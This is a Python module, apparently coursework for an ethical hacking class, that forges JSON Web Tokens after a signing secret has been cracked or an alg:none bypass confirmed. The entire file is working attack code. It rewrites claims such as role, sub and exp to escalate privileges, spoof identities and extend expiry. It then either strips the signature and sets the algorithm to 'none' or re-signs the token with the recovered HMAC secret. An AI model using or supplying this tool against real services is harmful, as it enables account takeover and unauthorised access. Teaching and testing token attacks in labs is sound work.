"""
forgery.py - post-exploitation token forging

once a signing secret has been recovered or an alg:none bypass
confirmed, this module forges a new token with attacker-specified
claim modifications

typical use cases:
    - privilege escalation: role=user -> role=admin
    - identity spoofing: sub=user123 -> sub=admin
    - extending expiry: exp=<past> -> exp=<future>

claim values are parsed intelligently - integers stay integers,
booleans stay booleans, and strings stay strings.

Author: Patrick Earley
Module: CMP320 Advanced Ethical Hacking
"""

import base64
import json
import hmac
import hashlib
import time


ALGO_MAP = {
    'HS256': hashlib.sha256,
    'HS384': hashlib.sha384,
    'HS512': hashlib.sha512,
}


def _b64url_encode(data):
    # encode a dict to Base64URL without padding
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _parse_value(value_str):
    """
    intelligently parse a claim value string into its most likely type.

    tries int, then float, then bool, then falls back to string.
    this means --forge exp=9999999999 gives an integer, not a string.
    """
    # integer
    try:
        return int(value_str)
    except ValueError:
        pass

    # float
    try:
        return float(value_str)
    except ValueError:
        pass

    # boolean
    if value_str.lower() == 'true':
        return True
    if value_str.lower() == 'false':
        return False

    # null
    if value_str.lower() == 'null':
        return None

    # string
    return value_str


def _parse_modifications(modifications):
    """
    parse a list of 'key=value' strings into a dict.

    arg in is a list of strings like ['role=admin', 'sub=attacker'].
    returns a dict and a list of any parse errors encountered.
    """
    parsed = {}
    errors = []

    for mod in modifications:
        if '=' not in mod:
            errors.append(f"invalid modification '{mod}' - must be in key=value format")
            continue
        key, _, value = mod.partition('=')
        key = key.strip()
        value = value.strip()
        if not key:
            errors.append(f"empty key in modification '{mod}'")
            continue
        parsed[key] = _parse_value(value)

    return parsed, errors


def forge(decoded, modifications, cracked_secret=None, use_alg_none=False):
    """
    forge a new jwt with modified claims.

    in args are the output of decoder.decode(), a list of 'key=value' 
    strings to apply to payload, the recovered HMAC secret 
    (from brute_force.py), and use_alg_none, which if True, forge 
    an unsigned alg:none token instead

    returns a list of finding dicts. successful forgeries include
    a 'forged_token' field and a 'modified_payload' field showing
    what the new payload looks like.
    """
    findings = []
    algorithm = decoded['algorithm']

    # parse the requested modifications
    modifications = modifications or []
    mods, errors = _parse_modifications(modifications)

    for error in errors:
        findings.append({
            'severity': 'INFO',
            'title': "modification parse error",
            'description': error
        })

    if not mods and not errors:
        findings.append({
            'severity': 'INFO',
            'title': "no modifications specified",
            'description': (
                "no claim modifications were provided. use --forge key=value "
                "to specify claims to modify in the forged token."
            )
        })
        return findings

    # build the modified payload
    original_payload = decoded['payload']
    forged_payload = {**original_payload, **mods}

    # alg:none forgery

    if use_alg_none:
        forged_header = {**decoded['header'], 'alg': 'none'}
        header_b64  = _b64url_encode(forged_header)
        payload_b64 = _b64url_encode(forged_payload)
        forged_token = f"{header_b64}.{payload_b64}."

        findings.append({
            'severity': 'CRITICAL',
            'title': "token forged via alg:none",
            'description': (
                f"a new unsigned token has been forged with the requested "
                f"claim modifications. the signature has been stripped and "
                f"the algorithm set to 'none'."
            ),
            'forged_token': forged_token,
            'modified_payload': forged_payload,
            'changes': mods
        })
        return findings

    # mac forgery with cracked secret

    if cracked_secret is not None:
        # use the original algorithm if it's HMAC, otherwise default to HS256
        sign_algo = algorithm if algorithm in ALGO_MAP else 'HS256'
        hash_fn = ALGO_MAP[sign_algo]

        forged_header = {**decoded['header'], 'alg': sign_algo}
        header_b64  = _b64url_encode(forged_header)
        payload_b64 = _b64url_encode(forged_payload)
        signing_input = f"{header_b64}.{payload_b64}"

        sig = hmac.new(
            cracked_secret.encode('utf-8'),
            signing_input.encode('utf-8'),
            hash_fn
        ).digest()

        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        forged_token = f"{signing_input}.{sig_b64}"

        findings.append({
            'severity': 'CRITICAL',
            'title': f"token forged with cracked secret",
            'description': (
                f"a new {sign_algo}-signed token has been forged using the "
                f"recovered secret '{cracked_secret}'. this token is "
                f"cryptographically valid and will be accepted by any server "
                f"using the same secret."
            ),
            'forged_token': forged_token,
            'modified_payload': forged_payload,
            'changes': mods
        })
        return findings

    # no signing method available

    findings.append({
        'severity': 'INFO',
        'title': "cannot forge - no signing method available",
        'description': (
            "token forgery requires either a cracked hmac secret "
            "(from brute_force.py) or alg:none mode (--forge with alg:none). "
            "run the brute-force attack first, or use --alg-none if the "
            "server accepts unsigned tokens."
        )
    })

    return findings